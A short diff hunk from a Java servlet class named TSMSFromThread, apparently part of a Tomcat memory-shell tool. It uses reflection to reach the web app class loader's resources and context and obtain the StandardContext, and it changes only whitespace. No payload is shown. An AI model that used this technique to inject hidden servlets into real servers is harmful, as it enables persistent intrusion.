@@ -31,8 +31,8 @@ public class TSMSFromThread implements Servlet {
             } catch (Exception ignored) {
                 Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                 field.setAccessible(true);
-                Object root   = field.get(webappClassLoaderBase);
-                Field  field2 = root.getClass().getDeclaredField("context");
+                Object root = field.get(webappClassLoaderBase);
+                Field field2 = root.getClass().getDeclaredField("context");
                 field2.setAccessible(true);
 
                 standardContext = (StandardContext) field2.get(root);
